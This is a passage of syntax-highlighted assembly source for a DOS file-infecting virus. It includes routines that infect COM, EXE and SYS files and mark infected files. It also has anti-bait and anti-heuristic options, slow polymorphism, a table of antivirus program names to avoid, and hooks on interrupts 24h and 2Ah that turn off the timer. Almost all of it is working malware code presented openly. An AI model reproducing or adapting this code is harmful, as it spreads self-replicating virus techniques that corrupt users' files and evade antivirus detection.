    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">; Write garbage</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
</span><span class="sc5">NoPatchSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FLen</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                </span><span class="sc1">; Mark file</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Infected</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Mark</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">    
</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CheckInf</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
</span><span class="sc5">CheckInfz</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">iCheck2</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckInf</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">infect</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">            </span><span class="sc1">; Main infection routine</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">si24</span><span class="sc0">           </span><span class="sc1">; Set int 24h</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    
</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">AAV</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckAv</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Open_Done</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Scan</span><span class="sc0">           </span><span class="sc1">; Scan for extension</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">MinGarb</span><span class="sc4">],</span><span class="sc5">MinG</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">MaxGarb</span><span class="sc4">],</span><span class="sc5">MaxG</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">AntiH1</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Use Anti-heuristics</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">UseInt</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Use ints</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Open_Done</span><span class="sc0">            </span><span class="sc1">; Al = 0 ?</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Its_Sys</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Its_Exe</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Its_Com</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Open_Done</span><span class="sc0">
</span><span class="sc5">Its_Com</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">if_command</span><span class="sc0">         </span><span class="sc1">; Check for command.com</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Open_Done</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_com</span><span class="sc0">         </span><span class="sc1">; Infect Com</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Open_Done</span><span class="sc0">
</span><span class="sc5">Its_exe</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect_exe</span><span class="sc0">         </span><span class="sc1">; Infect Exe</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Open_Done</span><span class="sc0">
</span><span class="sc5">Its_SyS</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect_Sys</span><span class="sc0">         </span><span class="sc1">; Infect Sys</span><span class="sc0">
</span><span class="sc5">Open_done</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ri24</span><span class="sc0">           </span><span class="sc1">; Restore int 24</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">infect</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">NoCBait</span><span class="sc0">
</span><span class="sc5">CheckBait</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">            </span><span class="sc1">; To the end of founded file</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">MinCom</span><span class="sc4">+</span><span class="sc5">Vlen</span><span class="sc0">      </span><span class="sc1">; This is not anti-bait routine, </span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">SeekS</span><span class="sc0">            </span><span class="sc1">; this is just simple </span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">150</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc0">      </span><span class="sc1">; Read 100</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">          </span><span class="sc1">; Check for equal bytes</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ItsBait</span><span class="sc0">
    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; Check for text strings</span><span class="sc0">
</span><span class="sc5">LCheck</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'z'</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">ProbablyNotText</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">ProbablyNotText</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">LCheck</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">ItsBait</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SeekS</span><span class="sc0">
</span><span class="sc5">ItsBait</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc5">SeekS</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckBait</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">If</span><span class="sc0"> </span><span class="sc5">SlowPoly</span><span class="sc0">
</span><span class="sc5">MakeSlow</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RSeed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RandSeed</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MakeSlow</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc9">EndIF</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">if</span><span class="sc0">  </span><span class="sc5">AAV</span><span class="sc0">
</span><span class="sc5">AVTbl</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'drweb'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'DRWEB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'aids'</span><span class="sc0">        </span><span class="sc1">; This AV not problem</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'AIDS'</span><span class="sc0">        </span><span class="sc1">; for us,but better not infect it...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc12">'f-prot'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc12">'F-PROT'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'adinf'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'ADINF'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'scan'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'SCAN'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc12">'vshiel'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc12">'VSHIEL'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'clean'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'CLEAN'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'findvir'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'FINDVIR'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'guard'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'GUARD'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc12">'tb'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc12">'TB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc12">'-V'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc12">'-v'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'virs'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'VIRS'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'avp'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'AVP'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">Endif</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">si24</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">            </span><span class="sc1">; Get old int 24h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old24</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old24</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i24</span><span class="sc0">       </span><span class="sc1">; Set int 24h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0">  </span><span class="sc5">i2Au</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

    </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">         </span><span class="sc1">; Turn off timer</span><span class="sc0">
    </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc6">cld</span><span class="sc0">
    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Get int 2Ah</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">o2A</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">o2A</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i2A</span><span class="sc0">       </span><span class="sc1">; Set int 2Ah</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">si24</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">i24</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">i2A</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">o2a</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">ri24</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old24</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Restore old int 24h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">i2Au</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">o2a</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Restore int 2Ah</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    
    </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11111110b</span><span class="sc0">            </span><span class="sc1">; Turn timer on</span><span class="sc0">
    </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ri24</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">savea</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dss</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">             </span><span class="sc1">; Store Ds:Dx for attributes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dxs</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">             </span><span class="sc1">; restore</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                </span><span class="sc1">; Get attribs</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                </span><span class="sc1">; Set attribs</span><span class="sc0">
</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">TestVir</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                </span><span class="sc1">; If test virus - skip</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">                       </span><span class="sc1">; attrib set</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">                
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
